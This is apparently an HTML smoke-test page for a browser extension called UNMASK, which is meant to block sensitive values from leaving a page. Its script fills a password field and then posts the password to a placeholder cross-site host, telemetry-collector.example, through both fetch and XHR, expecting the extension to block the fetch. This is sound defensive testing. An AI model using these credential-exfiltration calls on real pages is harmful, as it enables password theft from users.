<!doctype html>
<html>
<head>
<meta charset="utf-8" />
<title>UNMASK smoke test</title>
</head>
<body>
<h1>UNMASK Data X-Ray smoke test</h1>
<form id="login-form">
  <label for="pw">Password</label>
  <input id="pw" name="password" type="password" autocomplete="current-password" />
</form>
<pre id="log"></pre>
<script>
  const SECRET_VALUE = 'CorrectHorseBatteryStaple123';
  const log = (msg) => {
    document.getElementById('log').textContent += msg + '\n';
  };

  async function run() {
    const input = document.getElementById('pw');

    // Simulate entry of a sensitive value the same way a real user or a
    // password manager would: set .value and dispatch a real 'input' event.
    input.value = SECRET_VALUE;
    input.dispatchEvent(new Event('input', { bubbles: true }));
    log('filled password field');

    // Give the extension's debounce time to fingerprint the value.
    await new Promise((r) => setTimeout(r, 800));

    // Malicious-shaped fetch(): a cross-site destination carrying the
    // fingerprinted value. Expected: the firewall BLOCKS this before it
    // leaves the page (rejected with err.unmaskBlocked === true).
    try {
      await fetch('https://telemetry-collector.example/ingest', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ user: 'smoke-test', password: SECRET_VALUE })
      });
      log('cross-site fetch: NOT blocked (unexpected)');
    } catch (e) {
      log('cross-site fetch: ' + (e.unmaskBlocked ? 'BLOCKED by UNMASK (expected)' : 'network error - ' + e.message));
    }

    // Legitimate-shaped fetch(): same-site destination carrying the same
    // value (e.g. the real login submission). Expected: ALLOWED through.
    try {
      await fetch('/same-site-endpoint', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ user: 'smoke-test', password: SECRET_VALUE })
      });
      log('same-site fetch: allowed through (expected)');
    } catch (e) {
      log('same-site fetch: ' + (e.unmaskBlocked ? 'BLOCKED by UNMASK (unexpected!)' : 'network error - ' + e.message));
    }

    // Real XHR to the cross-site destination too, to confirm the
    // (unmodified, observe-only for now) XHR vector still behaves as before.
    await new Promise((resolve) => {
      const xhr = new XMLHttpRequest();
      xhr.open('POST', 'https://telemetry-collector.example/xhr-ingest');
      xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
      xhr.onloadend = resolve;
      xhr.onerror = resolve;
      xhr.send('user=smoke-test&password=' + encodeURIComponent(SECRET_VALUE));
    });

    log('done - check backend /incidents for BLOCKED and OBSERVED events');
  }

  run();
</script>
</body>
</html>
